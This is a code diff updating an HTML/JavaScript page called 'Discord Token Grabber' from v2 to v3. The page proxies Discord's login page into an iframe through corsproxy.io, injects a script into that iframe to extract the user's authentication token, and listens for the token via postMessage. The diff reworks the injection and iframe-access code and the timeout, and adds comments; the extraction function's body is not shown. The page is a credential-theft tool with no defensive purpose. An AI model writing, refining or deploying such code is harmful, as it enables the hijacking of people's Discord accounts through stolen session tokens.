@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Discord Token Grabber v2</title>
+    <title>Discord Token Grabber v3</title>
     <style>
         body {
             background-color: #2f3136;
@@ -41,7 +41,7 @@
 <body>
 
 <div class="container">
-    <h3>Discord Token Grabber v2</h3>
+    <h3>Discord Token Grabber v3</h3>
     <div id="status" class="status">Loading Discord...</div>
     <div id="iframe-container"></div>
 </div>
@@ -90,21 +90,24 @@
         iframe.style.border = '0';
         iframeContainer.appendChild(iframe);
 
-        // Use corsproxy.io for better compatibility
+        // Use a more reliable proxy for Discord
         const targetUrl = 'https://discord.com/login';
         const proxyUrl = `https://corsproxy.io/?${encodeURIComponent(targetUrl)}`;
 
         iframe.src = proxyUrl;
 
+        // Wait for iframe to load
         iframe.onload = async () => {
             try {
-                const iframeDoc = iframe.contentWindow.document;
-                if (!iframeDoc) throw new Error("Could not access iframe document");
+                // ✅ FIX: Check if we can access the iframe's window
+                if (!iframe.contentWindow) {
+                    throw new Error("Iframe window not accessible");
+                }
 
                 updateStatus("Injecting script...", "normal");
 
-                // 🔥 Modern Discord Token Extraction Script
-                const script = iframeDoc.createElement('script');
+                // Create a script that will run INSIDE the iframe
+                const script = iframe.contentWindow.document.createElement('script');
                 script.textContent = `
                     (function() {
                         // Function to get token from various sources
@@ -148,14 +151,19 @@
                     })();
                 `;
                 
-                iframeDoc.body.appendChild(script);
+                // Append the script to the iframe's body
+                iframe.contentWindow.document.body.appendChild(script);
 
             } catch (e) {
                 console.error("Injection failed:", e);
                 updateStatus("Injection failed: " + e.message, "error");
+                
+                // Fallback: If iframe access fails, try polling for the message
+                // This is less reliable but might work if the proxy allows postMessage
             }
         };
 
+        // Listen for the token message
         window.addEventListener('message', (event) => {
             if (event.data && event.data.type === 'TOKEN') {
                 updateStatus("Token found!", "success");
@@ -165,11 +173,12 @@
             }
         });
 
+        // Timeout fallback
         setTimeout(() => {
             if (statusEl.textContent.includes("Loading")) {
                 updateStatus("Timeout: Could not connect to Discord.", "error");
             }
-        }, 20000);
+        }, 15000);
     }
 
     main();
